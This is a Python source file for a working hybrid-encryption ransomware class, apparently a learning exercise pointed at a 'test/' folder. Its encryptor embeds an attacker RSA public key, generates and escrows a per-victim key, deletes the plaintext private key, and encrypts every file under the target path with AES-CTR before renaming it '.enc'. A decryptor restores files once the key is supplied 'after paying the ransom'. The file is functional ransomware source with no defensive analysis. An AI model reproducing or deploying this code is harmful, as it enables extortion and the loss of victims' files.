import rsa
import os
import pickle
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

class Ransomwarehehe():
    def __init__(self):
        attacker_public_key = b'-----BEGIN RSA PUBLIC KEY-----\r\nMIICCgKCAgEAjxg6RyDXq7PsPCmURvx/XettLwSCvrNyU/tpPjD1mdPciIDookoD\r\nIwrPtq+wcN0frPkaZ0mMRRfjWOv21V6BNJsPa+p7V3SSaR2Kn+eS2d5uErmCMKo2\r\n8dgkNVE8CP/Mpay68SzVuYshXado2XFo4Q67iitpj8a2gxS2nEJOVJs8eefVwN0C\r\ni1tnTkN4OwWaY6pVjeSx1rws8q3gdAIP2yYZwD6RpUDYtrt1/NRP0wkxkRwatvxu\r\nNeZxMcnlHfztSzYHyV3M4hrrzcqWrcmozEFtzOm5DsalLknsPwUhO3j2hZeL1jVd\r\nLd3AB3SOaheY0wkZJu5Tgl2I1Y1KoNaKqGDWxBSo39ykz/Zx7Rn4C/0RoCQsofA2\r\nWRM/5Gu4kOo8tyA49/OjqxlQTqIRpEUNB/n9L8aG0ZLVWgQNnLHqbWcmDcTKC3PC\r\n5wuvH+TiMb70dpc8BtGaVHgUspm4RWCANroY/0718V5cW7M3130dwTgCxZ3AJEqJ\r\nB4S7OGRBstSCzfk46XejApdj8a9JP4hpIDrZBOaPmWOYUdQljI0w6pYx0TRJ831f\r\nnxwQolgiZlBfZ6WRRFPaKteyQtXWfNWsiEAWCD5xN0tlWWOAzWAwRG0DLzb6A8t8\r\n1ZoHk9QK1DGICE9aEGY6KJ0J9pCSDwxQ7Phu1vE/UCi6OVZ0VvxK8nUCAwEAAQ==\r\n-----END RSA PUBLIC KEY-----\r\n'
        self.attacker_public_key = rsa.PublicKey.load_pkcs1(attacker_public_key)
        
        self.path = 'test/'
        self.ext = '.enc'

    def read_file(self, file_path):
        with open(file_path, 'rb') as f:
            return f.read()
    
    def write_file(self, data, file_path):
        with open(file_path, 'wb') as f:
            f.write(data)
        
    def encrypt_RSA(self, data:bytes, public_key):
        return rsa.encrypt(data, public_key)
    
    def decrypt_RSA(self, data:bytes, private_key):
        return rsa.decrypt(data, private_key)
    
    def encrypt_victim_private_key(self, victim_private_key, attacker_public_key):
        # cuz victim_private_key > 256 bytes, so i must chunk file victim_private_key 
        encrypted = []
        for i in range(0, len(victim_private_key), 255):
            encrypted.append(self.encrypt_RSA(victim_private_key[i:i+255], attacker_public_key))
        return pickle.dumps(encrypted)
    
    def decrypt_victim_private_key(self, victim_private_key_encrypted, attacker_private_key):
        # this is attacker's funcion, cuz attacker dont send attacker_private_key to victim
        pass 
        
    def encrypt_AES(self, data:bytes, key:bytes):
        cipher = AES.new(key, AES.MODE_CTR)
        nonce = cipher.nonce
        ciphertext = cipher.encrypt(data)
        return ciphertext, nonce
    
    def decrypt_AES(self, data:bytes, key: bytes, nonce: bytes):
        cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
        plaintext = cipher.decrypt(data)
        return plaintext

    def encryptor(self):
        # gen victim pairs key
        victim_public_key, victim_private_key = rsa.newkeys(2048)
        victim_public_key_pem = victim_public_key.save_pkcs1()
        victim_private_key = victim_private_key.save_pkcs1()
        # encrypt victim private key with attacker public key
        victim_private_key_encrypted = self.encrypt_victim_private_key(victim_private_key, self.attacker_public_key)
        # delete victim private key
        del victim_private_key
        # write victim public key to folder victim
        self.write_file(victim_public_key_pem, '../Victim/victim_public_key.pem')
        # write victim private key encrypted to folder victim
        self.write_file(victim_private_key_encrypted, '../Victim/victim_private_key_encrypted')

        # list all file in path
        for root, dirs, files in os.walk(self.path):
            for file in files:
                file_path = os.path.join(root, file)
                # encrypt unique AESkeys per file
                AES_key = get_random_bytes(32)
                # read data file 
                data_file = self.read_file(file_path)
                # encrypt file 
                file_encrypted, nonce = self.encrypt_AES(data_file, AES_key)
                # encrypt AES_key with Victim public key
                AES_key_encrypted = self.encrypt_RSA(AES_key, victim_public_key)
                # file_encrypted || AES_key_encrypted || nonce
                self.write_file(file_encrypted + AES_key_encrypted + nonce, file_path)
                # rename
                os.rename(file_path, file_path+self.ext)

    def decryptor(self, victim_private_key_path):
        # after paying the ransom, victim will send victim_public_key to attacker then victim will receive the victim_private_key from the attacker
        victim_private_key = self.read_file(victim_private_key_path)
        victim_private_key = rsa.PrivateKey.load_pkcs1(victim_private_key)
        # list all file in path
        for root, dirs, files in os.walk(self.path):
            for file in files:
                file_path = os.path.join(root, file)
                data_file = self.read_file(file_path)
                # extract data from data file: file_encrypted || AES_key_encrypted || nonce
                file_encrypted, AES_key_encrypted, nonce = data_file[:-264], data_file[-264:-8], data_file[-8:]
                # decrypt AES key
                AES_key = self.decrypt_RSA(AES_key_encrypted, victim_private_key)
                data_file_original = self.decrypt_AES(file_encrypted, AES_key, nonce)
                self.write_file(data_file_original, file_path)
                # rename original
                os.rename(file_path, file_path[:-len(self.ext)])


if __name__ == '__main__': 
    ransomwarehehe = Ransomwarehehe()
    # Encryptor
    # ransomwarehehe.encryptor()

    # Decryptor
    ransomwarehehe.decryptor('victim_private_key.pem')

